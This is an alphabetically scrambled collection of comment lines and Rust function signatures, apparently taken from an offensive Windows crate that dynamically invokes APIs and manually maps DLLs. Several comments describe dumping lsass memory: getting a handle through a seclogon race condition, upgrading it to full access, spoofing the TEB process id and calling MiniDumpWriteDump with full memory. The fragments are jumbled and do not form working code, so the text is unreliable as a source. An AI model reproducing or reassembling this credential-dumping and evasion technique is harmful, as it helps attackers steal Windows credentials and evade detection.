"//
"//         Err(e) => println!(""{}"",e),"
"//         Ok(addr) => println!(""The address where RtlDispatchAPC is located at is 0x{:X}."", addr),"
"//         println!(""Handle to process with id {} closed."", pid);"
"//     Err(e) => println!(""{}"",e),"
"//     None => println!(""Error calling LdrGetProcedureAddress""),"
"//     Ok(addr) => if addr != 0 {println!(""ntdll.dll base address is 0x{:X}."", addr)},"
"//     Some(x) => if x == 0 {println!(""RtlDispatchAPC is located at the address: 0x{:X}"",*return_address as u64);},"
"//     Some(x) => if x.0 == 0 {println!(""ntdll base address is 0x{:X}"",x.0);},"
"//     let addr = dinvoke::get_function_address(ntdll, ""NtCreateThread"");    "
"//     let addr = dinvoke::get_function_address_ordinal(ntdll, 8);    "
"//     let ret = dinvoke::ldr_get_procedure_address(ntdll,"""", 8);"
"//     println!(""Handle to process with id {} with PROCESS_DUP_HANDLE access right successfully obtained."", pid);"
"//     println!(""The address where NtCreateThread is located at is 0x{:X}."", addr);"
"//     println!(""The base address of ntdll.dll is 0x{:X}."", ntdll);"
"//     println!(""The function with ordinal 8 is located at 0x{:X}."", addr);"
"//    let pe = manualmap::read_and_map_module(""c:\\some\\random\\file.dll"").unwrap();"
"//    let ret = dinvoke::call_module_entry_point(&pe.0, pe.1);"
"// //dinvoke::dynamic_invoke(i64,&str,<function_type>,Option<return_type>,[arguments])"
"// In any other case, it will return the same data type that the called function would return"
"// Therefore, we first duplicate the handle with the same access"
"// dinvoke::dynamic_invoke!(ptr,""LdrGetProcedureAddress"",function_ptr,ret,hmodule,fun_name,ordinal,return_address);"
"// dinvoke::dynamic_invoke(&a.0, a.1, ret); // dinvoke::dynamic_invoke(&PeMetadata, i64, bool)"
"// dinvoke::dynamic_invoke(a.1, ""LoadLibraryA"", function_ptr, ret, module_name);"
"// if ret { println!(""Entry point successfully called."");}"
"// let a = manualmap::read_and_map_module(""c:\\some\\random\\file.dll"").unwrap();"
"// let handle = dinvoke::open_process(0x0040, 0, pid).unwrap(); //PROCESS_DUP_HANDLE access right."
"// let kernel32 = manualmap::read_and_map_module(""c:\\windows\\system32\\kernel32.dll"").unwrap();"
"// let name = CString::new(""ntdll.dll"").expect(""CString::new failed"");"
"// let ntdll = dinvoke::get_module_base_address(""ntdll.dll"");"
"// let ptr = dinvoke::get_module_base_address(""ntdll.dll"");"
"// let ret = dinvoke::load_library_a(""ntdll.dll"");"
"// lsass handle obtained from seclogon's race condition cant be upgraded directly, two steps are required"
"// required to keep fields order, otherwise Rust may change that order randomly"
//     
//     if r
//     let ordinal: u32 = 8; 
//     let ordinal: u32 = 8; // Ordinal 8 represents the function RtlDispatchAPC
//     let r = dinvoke::close_handle(handle).unwrap();
//     match ret {
//     {
//     }
// # Example - Dynamically calling LoadLibraryA
// # Example - Dynamically calling with referenced arguments
// 0x00000001|0x00000002|0x00000004 = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
// 0x00000002 = LOGON_NETCREDENTIALS_ONLY 
// 0x40000000 = FILE_FLAG_OVERLAPPED
// 0x80 = FILE_READ_ATTRIBUTES
// 3 = OPEN_EXISTING
// 47 = FileProcessIdsUsingFileInformation
// 997 = ERROR_IO_PENDING
// Access denied error pops if this pointer is not liberated.
// Calls the module's entry point with the option DLL_ATTACH_PROCESS.
// Closes a HANDLE object.
// DUPLICATE_SAME_ACCESS
// Duplicate handle in order to manipulate it
// Dynamically calls CreateFileMappingW.
// Dynamically calls CreateFileTransactedA.
// Dynamically calls CreateTransaction.
// Dynamically calls GetFileSize.
// Dynamically calls MapViewOfFile.
// Dynamically calls MiniDumpWriteDump.
// Dynamically calls NtAllocateVirtualMemory.
// Dynamically calls NtDuplicateObject.
// Dynamically calls NtOpenProcess.
// Dynamically calls NtProtectVirtualMemory.
// Dynamically calls NtQueryInformationFile.
// Dynamically calls NtQueryInformationProcess.
// Dynamically calls NtQueryInformationThread.
// Dynamically calls NtQueryObject.
// Dynamically calls NtQuerySystemInformation.
// Dynamically calls NtWriteVirtualMemory.
// Dynamically calls QueryFullProcessImageNameW.
// Dynamically calls RollbackTransaction.
// Dynamically calls RtlAdjustPrivilege.
// Dynamically calls SetHandleInformation.
// Dynamically calls UnmapViewOfFile.
// Dynamically calls an exported function from the specified module.
// Each char is followed by \0. Lovely LPWSTR...
// FILE_MAP_READ
// Get current thread's basic information
// I dont really think it does exist a process image name longer than 500 characters
// Loads and retrieves a module's base address by dynamically calling LoadLibraryA.
// MiniDumpWithFullMemory
// OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE
// Opens a HANDLE to a process.
// PROCESS_DUP_HANDLE as access right
// PROCESS_QUERY_INFORMATION & PROCESS_VM_READ 
// Query the system looking for handles information
// REQUEST_OPLOCK_CURRENT_VERSION
// REQUEST_OPLOCK_INPUT_FLAG_REQUEST
// Retrieves the address of an exported function from the specified module by its ordinal.
// Retrieves the address of an exported function from the specified module either by its name 
// Retrieves the address of an exported function from the specified module.
// Retrieves the base address of a module loaded in the current process.
// TEB pid spoofing
// The key thing you are missing
// This is required due to Rust optimizations in order to keep the handle active.
// We have a process handle
// We have a valid process handled
// We need to upgrade our lsass handle to full accesss in order to be able to dump the memory content
// We obtain information about the handle. Two calls to NtQueryObject are required in order to make it work.
// We use the duplicated handle to dump the process memory
// ```
// and PE headers.
// descriptive error message.
// fails the HANDLE will have value -1 or 0.
// fails the bool value returned will be false.
// function address of the specified module in the runtime by walking process structures 
// function's address is obtained by walking and parsing the EAT of the  
// if handle.0 != 0 && handle.0 != -1
// let fun_name: *mut String = ptr::null_mut();
// let function_ptr: LdrGetProcedureAddress;
// let function_ptr: data::LoadLibraryA;
// let hmodule: PVOID = std::mem::transmute(ptr);
// let module_name = PSTR{0: name.as_ptr() as *mut u8};
// let mut ret:Option<HINSTANCE>;
// let ordinal = 8 as u32;
// let pid = 792u32;
// let ret: Option<i32>;
// let ret: bool = false;
// let return_address: *mut PVOID = std::mem::transmute(return_address);
// let return_address: *mut c_void = std::mem::transmute(&u64::default());
// null byte
// offset 0x00
// offset 0x04
// offset 0x08
// offset 0x0C
// offset 0x10
// offset 0x14
// or by its ordinal number.
// or false (using the 3rd argument passed to the macro) depending on the success of the call.
// return 0.
// specified module.
// using the 4th argument passed to the macro.
// {
// }
/// # Example - Calling a dll entry point"
/// # Examples"
/// In case that the function's address can't be retrieved, it will return 0."
/// In case that the function's address can't be retrieved, it will return an Err with a "
/// In case that the module can't be found in the current process, it will"
/// In case that this macro is used to call a dll entry point (DllMain), it will return true"
/// It will return either a HANDLE object or an Err with a descriptive error message. If the function"
/// It will return either a boolean value or an Err with a descriptive error message. If the function"
/// It will return either the module's base address or an Err with a descriptive error message."
/// It will return the NTSTATUS value returned by the call."
/// This functions internally calls LdrGetProcedureAddress."
/// This functions is analogous to GetProcAddress from Win32. The exported "
/// This macro will use the dinvoke crate functions to obtain an exported"
/// ```"
/// ```ignore"
/// if ntdll != 0"
/// match ret {"
pub fn create_file_mapping (file: HANDLE, attributes: *const SECURITY_ATTRIBUTES, protect: u32, max_size_high: u32, max_size_low: u32, name: *mut u8) -> HANDLE {"
pub fn create_file_transacted(name: *mut u8, access: u32, mode: u32, attributes: *const SECURITY_ATTRIBUTES, disposition: u32, flags: u32, template: HANDLE, transaction: HANDLE, version: *const u32, extended: PVOID) -> HANDLE {"
pub fn create_transaction(attributes: *mut SECURITY_ATTRIBUTES,uow: *mut GUID, options: u32, isolation_level: u32, isolation_flags: u32, timeout: u32, description: *mut u16) -> HANDLE {"
pub fn get_file_size(handle: HANDLE, size: *mut u32) -> u32 {"
pub fn map_view_of_file (file: HANDLE, access: u32, off_high: u32, off_low: u32, bytes: usize) -> PVOID {"
pub fn mini_dump_write_dump (process: HANDLE, process_id: u32, file: HANDLE, dump_type: u32, exception: *mut MINIDUMP_EXCEPTION_INFORMATION, stream: *mut MINIDUMP_USER_STREAM_INFORMATION, callback: *mut MINIDUMP_CALLBACK_INFORMATION) -> i32 {"
pub fn query_full_process_image_name(process_handle: HANDLE, flags: u32, name: *mut u16, size: *mut u32) -> i32 {"
pub fn rollback_transaction(transaction: HANDLE) -> bool {"
pub fn set_handle_information (object: HANDLE, mask: u32, flags: u32) -> bool {"
pub fn unmap_view_of_file (base_address: PVOID) -> bool {"
